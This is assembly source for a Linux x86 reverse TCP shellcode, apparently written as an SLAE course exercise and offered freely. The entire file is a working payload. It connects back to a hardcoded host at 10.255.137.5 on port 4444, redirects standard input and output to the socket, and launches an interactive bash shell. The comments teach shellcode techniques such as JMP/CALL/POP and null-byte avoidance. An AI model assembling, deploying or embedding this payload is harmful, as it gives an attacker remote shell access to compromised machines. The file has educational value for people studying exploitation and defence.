;-------------------------------------------------
; reverse-tcp.nasm
; by Michael Born (@blu3gl0w13)
; Student ID: SLAE-744
; August 30, 2016
;
; Free to use and distribute as you see fit
;
; similar to bind-shell-bash.nasm
; but we'll use connect() instead
; and will manipulate file descriptors
; with sockfd and then invoke /bin///bash -i
;
;------------------------------------------------



global _start

section .text

_start:

	; now we invoke __NR_SOCKETCALL syscall
	; just like we did in our bind shell

	xor eax, eax		; zero out eax
	xor ebx, ebx		; zero out ebx
	push byte 0x6		; push parameter 3 TCP Protocol
	push byte 0x1		; push parameter 2 SOCK_STREAM
	push byte 0x2		; push parameter 1 
	mov al, 0x66		; socketcall syscall
	mov bl, 0x1		; int socket(int domain, int type, int protocol)
	mov ecx, esp		; parameters
	int 0x80		; call it

	mov edi, eax		; save that sockfd


jumper:

	; JMP/CALL/POP for IP and PORT address

	jmp short ip_port


connector:

	; Now we set up the connection with our IP/PORT
	; we'll have to put together the struct again
	; similar to our bind shell
	;
	; int connect(int sockfd, const struct sockaddr *addr,
        ;           socklen_t addrlen)

	pop esi			; store IP and PORT in esi
	xor eax, eax		; clean out eax, remember edi has has sockfd
	xor ecx, ecx
	push dword [esi]	; IP onto stack
	push word [esi +4]	; PORT onto stack
	mov al, 0x2		; AF_INET IPv4 
	push ax			; struct is set up
	mov eax, esp		; store the pointer to a register temporarily
	push byte 0x10		; parameter 3 16 bytes in length
	push eax		; parameter 2, pointer to struct
	push edi		; parameter 1, sockfd
	xor eax, eax		; clean out eax again
	mov al, 0x66		; __NR_SOCKETCALL
	xor ebx, ebx		; clean out ebx
	mov bl, 0x3		; connect()
	mov ecx, esp		; pointer to parameters
	int 0x80		; call it, will return 0 on success 

redirect_fd:

	; once again, we'll use dup2()
	;
	; int dup2(int oldfd, int newfd)
	;


	xor ebx, ebx		; clean ebx
	xor ecx, ecx		; clean ecx
	mov ebx, edi		; sockfd
	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
	int 0x80		; call it
	inc ecx			; 1 for std out
	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
	int 0x80		; call it
	inc ecx			; 2 for std error
	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
	int 0x80		; call it


shelltime:

        ; now it's time to launch our shell
        ; program using execve. I prefer
        ; /bin/bash we'll use /bin////bash
        ; execve is 0xb (11)
        ; int execve(const char *filename, char *const argv[],
        ;          char *const envp[])


        xor eax, eax    	; clean out eax
        push eax        	; need a null byte for execve parameters
        push 0x68736162 	; hsab
        push 0x2f2f2f2f 	; ////
        push 0x6e69622f 	; nib/
        mov ebx, esp    	; save stack pointer in ebx
        push eax        	; Null onto stack
        push word 0x692d        ; "-i" parameter to /bin/bash
        mov esi, esp    	; save the argument pointer
        push eax        	; null byte terminator
        push esi        	; pointer to "-i" parameter to /bin/bash
        push ebx        	; points to 0x00hsab////nib/
        mov ecx, esp    	; store pointer to 0x00hsab////nib/ into ecx
        xor edx, edx    	; NULL as last parameter
        mov al, 0xb     	; execve
        int 0x80        	; call it



ip_port:

	call connector
	ip_address:	dd 0x589ff0a		; 10.255.137.5
	port: 		dw 0x5c11		; 4444 see iptohex.py	
